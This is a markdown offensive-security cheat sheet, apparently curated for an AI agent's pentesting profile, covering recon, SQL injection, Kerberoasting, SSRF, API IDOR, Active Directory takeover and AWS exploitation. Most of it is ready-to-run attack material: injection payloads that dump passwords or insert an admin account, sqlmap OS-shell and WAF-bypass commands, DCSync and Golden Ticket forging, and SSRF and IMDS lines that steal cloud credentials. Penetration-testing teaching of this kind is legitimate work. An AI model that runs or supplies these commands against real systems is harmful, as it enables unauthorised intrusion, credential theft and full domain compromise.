# Offensive Security Reference Library

> Source: [mukul975/Anthropic-Cybersecurity-Skills](https://github.com/mukul975/Anthropic-Cybersecurity-Skills) (Apache 2.0)
> Curated for `cyber-sloth-engineering:offensive-security-engineer`

---

## Quick Lookup

### By Attack Phase

| Phase | Key Techniques | MITRE Tactic |
|-------|---------------|--------------|
| Reconnaissance | OSINT, subdomain enumeration, port scanning, Google dorking, Shodan | TA0043 |
| Initial Access | Spearphishing, web app exploits, valid accounts, external service exploitation | TA0001 |
| Execution | PowerShell, user execution, command injection | TA0002 |
| Persistence | Registry run keys, scheduled tasks, services | TA0003 |
| Privilege Escalation | Kerberoasting, ADCS abuse, UAC bypass, delegation attacks | TA0004 |
| Defense Evasion | Process injection, obfuscation, AMSI bypass | TA0005 |
| Credential Access | LSASS dump, DCSync, Kerberoasting, AS-REP roasting | TA0006 |
| Lateral Movement | PsExec, WMI, Pass-the-Hash, SMB, RDP | TA0008 |
| Exfiltration | C2 channel, DNS exfiltration, alternative protocols | TA0010 |

### By Target

| Target | Key Approaches |
|--------|---------------|
| Web Applications | SQLi (error/union/blind/time-based), XSS, SSRF, command injection, file upload bypass |
| APIs | BOLA/IDOR, mass assignment, JWT attacks, parameter pollution, method switching |
| Active Directory | Kerberoasting, AS-REP roasting, DCSync, Golden/Silver tickets, ADCS ESC1-ESC8 |
| Cloud (AWS/Azure/GCP) | IAM privilege escalation, metadata service (IMDS), S3 exposure, cross-account trust abuse |
| External Network | Service enumeration, CVE exploitation, password spraying, VPN/SNMP/SMTP attacks |

---

## Detailed References

### External Network Pentest Reconnaissance

**Passive recon:**
```bash
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
theHarvester -d target.com -b all -l 500 -f results
shodan search "org:Target Corp" --fields ip_str,port,product
trufflehog github --org=targetcorp --concurrency=5  # Secret scanning
```

**Active scanning:**
```bash
nmap -sS -p- -T4 --min-rate 1000 203.0.113.0/24 -oA full_tcp
nmap -sV -sC -p 21,22,25,80,443,445,3389,8080 203.0.113.0/24 -oA service_scan
nuclei -l all_subs.txt -t cves/ -t exposures/ -severity critical,high -o nuclei.txt
gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x php,asp,html
```

### SQL Injection Methodology

**Discovery:** Inject `'` into every parameter (GET, POST, Cookie, headers, JSON). Watch for SQL errors or boolean differences between `' AND 1=1--` and `' AND 1=2--`. Time-based: `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `' AND SLEEP(5)--` (MySQL). Test second-order injection where input is stored and later used in a different SQL query.

**Fingerprinting:** MySQL uses `@@version`, MSSQL uses `@@version` + `DB_NAME()`, PostgreSQL uses `version()`. Concatenation differs: MySQL `CONCAT()`, MSSQL `+`, PostgreSQL/Oracle `||`.

**Manual techniques:**
```
UNION-based:   ' UNION SELECT NULL,username,password,NULL FROM users--
Error-based:   ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
Blind boolean: ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
Time-based:    ' AND IF(SUBSTRING((SELECT password FROM users),1,1)='a',SLEEP(5),0)--
Stacked:       '; INSERT INTO users(username,password,role) VALUES('attacker','pass','admin')--
```

**Exploitation with sqlmap:**
```bash
sqlmap -u "https://target.com/page?id=1" --batch --dbs --risk=3 --level=5
sqlmap -u "https://target.com/page?id=1" -D <db> -T users --dump --threads 5
sqlmap -u "https://target.com/login" --data="user=test&pass=test" -p user  # POST params
sqlmap -u "https://target.com/page?id=1" --os-shell   # If DB user has privileges
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between  # WAF bypass
```

### Kerberoasting Attack Chain

```bash
# 1. Enumerate accounts with SPNs
GetUserSPNs.py corp.local/jsmith:Password123 -dc-ip 10.10.10.1

# 2. Request TGS tickets
GetUserSPNs.py corp.local/jsmith:Password123 -dc-ip 10.10.10.1 \
  -request -outputfile kerberoast_hashes.txt

# 3. Crack offline (RC4 = mode 13100, AES-256 = mode 19700)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule

# 4. Validate and use cracked credentials
crackmapexec smb 10.10.10.1 -u svc_sql -p 'Summer2024!' -d corp.local
```

**High-value targets:** Service accounts in Domain Admins, SQL service accounts (MSSQLSvc), Exchange accounts, accounts with AdminCount=1, accounts with old passwords.

### SSRF Exploitation

**SSRF-prone features:** URL previews, webhooks, PDF generators, image fetchers, RSS aggregation, OAuth callbacks.

**Cloud metadata payloads:**
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

**Filter bypass techniques:** Octal (`0177.0.0.1`), hex (`0x7f.0.0.1`), decimal (`2130706433`), IPv6 (`[::1]`), short form (`127.1`), DNS rebinding (`127.0.0.1.nip.io`), URL embedding (`expected.com@evil.com`), protocol switching (`gopher://`, `file://`, `dict://`).

### API BOLA/IDOR Testing

**Methodology:** Capture requests as User A, replace all object IDs with User B's IDs. Test all HTTP methods (GET may be blocked but PUT/PATCH/DELETE allowed). Test nested paths, batch endpoints, parameter pollution, and body ID overrides.

**Advanced techniques:**
- Parameter pollution: `/orders/5001?order_id=5003`
- Batch inclusion: `POST /orders/batch {"order_ids": [5001, 5003]}`
- Method switching: Test GET, PUT, PATCH, DELETE, HEAD on same endpoint
- GraphQL node queries with base64-encoded relay IDs

### Active Directory Attack Paths

**Enumeration:** BloodHound data collection with `bloodhound-python -u user -p pass -d corp.local -c all --zip`. Key queries: shortest path to DA, Kerberoastable users, DCSync rights, AS-REP roastable accounts.

**ADCS attacks (Certipy):**
```bash
certipy find -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.5 -vulnerable -stdout
certipy req -u 'user@corp.local' -p 'Pass' -target ca.corp.local \
  -ca CORP-CA -template VulnerableWebServer -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5
```

**Delegation attacks:**
```bash
# Constrained delegation -- S4U abuse
impacket-getST 'corp.local/svc_web:WebPass123' -spn 'CIFS/fileserver.corp.local' \
  -dc-ip 10.0.0.5 -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@fileserver.corp.local' -k -no-pass
```

**Domain dominance:**
```bash
# DCSync -- extract all domain hashes
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc
# Golden Ticket (requires krbtgt hash + domain SID)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local administrator
# Silver Ticket for specific service
impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/sqlserver.corp.local administrator
```

### Cloud Penetration Testing

**AWS enumeration and exploitation:**
```bash
aws sts get-caller-identity                # Verify current identity
aws iam list-users && aws iam list-roles   # IAM enumeration
aws s3 ls s3://<bucket> --no-sign-request  # Public bucket test
aws lambda get-function --function-name <name>  # Download function code
# IMDS credential theft (from compromised instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IAM privilege escalation paths:** `iam:CreatePolicyVersion` (grant admin), `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` (execute as privileged role), `iam:AttachUserPolicy` (attach AdministratorAccess), `sts:AssumeRole` (cross-account pivot).

**Automated tools:** `run iam__privesc_scan` (Pacu), `scout aws --profile <profile>` (ScoutSuite), `prowler aws` (CIS benchmarks).

---

## Tool Guidance

| Tool | Purpose | Key Commands |
|------|---------|-------------|
| **Nmap** | Port scanning, service enumeration | `nmap -sS -sV -sC -p- -T4 target` |
| **sqlmap** | SQL injection automation | `sqlmap -u URL --batch --dbs` |
| **Impacket** | AD attacks (Kerberoasting, DCSync, PsExec) | `GetUserSPNs.py`, `secretsdump.py`, `psexec.py` |
| **BloodHound** | AD attack path analysis | `bloodhound-python -c all --zip` |
| **Certipy** | ADCS exploitation | `certipy find -vulnerable`, `certipy req` |
| **Burp Suite** | Web/API interception and testing | Autorize extension for BOLA detection |
| **SSRFmap** | SSRF exploitation framework | Automated protocol and bypass testing |
| **Nuclei** | Vulnerability scanning at scale | `nuclei -l subs.txt -t cves/ -severity critical,high` |
| **Hashcat** | Offline password cracking | `-m 13100` (Kerberos), `-m 5600` (NTLMv2) |
| **CrackMapExec/NetExec** | AD enumeration and exploitation | `netexec smb target -u user -p pass --users` |
| **Rubeus** | Windows Kerberos attacks | `Rubeus.exe kerberoast /outfile:hashes.txt` |
| **Metasploit** | Exploitation framework | `msfconsole`, `msfvenom` for payloads |

---

## Engagement Metrics

| Metric | Description |
|--------|-------------|
| Mean Time to Detect (MTTD) | Time from red team action to SOC detection |
| Mean Time to Respond (MTTR) | Time from detection to containment |
| TTP Coverage | Percentage of executed techniques detected |
| Dwell Time | Total undetected access duration |
| Objective Achievement Rate | Percentage of defined objectives completed |

## Reporting Severity

| Severity | CVSS | Timeline |
|----------|------|----------|
| Critical | 9.0-10.0 | Patch within 24-48 hours |
| High | 7.0-8.9 | Fix within 1-2 weeks |
| Medium | 4.0-6.9 | Remediate within 30 days |
| Low | 0.1-3.9 | Fix within 60-90 days |
